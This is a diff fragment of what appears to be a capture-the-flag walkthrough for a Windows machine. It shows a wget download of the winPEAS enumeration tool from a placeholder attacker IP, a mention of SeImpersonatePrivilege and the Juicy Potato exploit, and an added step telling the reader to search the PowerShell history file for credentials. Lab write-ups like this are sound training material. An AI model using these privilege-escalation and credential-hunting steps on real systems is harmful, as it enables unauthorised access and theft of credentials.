@@ -152,7 +152,13 @@ wget http://@IP/winPEASx64.exe -outfile winPEASx64.exe
 PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe
 ```
 
-Can observer that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which is also vulnerable to [juicy potato exploit](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato). However, check the two existing files where credentials could be possible to be found.
+Can observer that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which is also vulnerable to [juicy potato exploit](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato).
+
+sql_svc is a normal user so it's worth checking for frequently access files or executed commands. Check the Powershell history file.
+
+````    
+```
+ConsoleHost_history.txt`
 
 
 
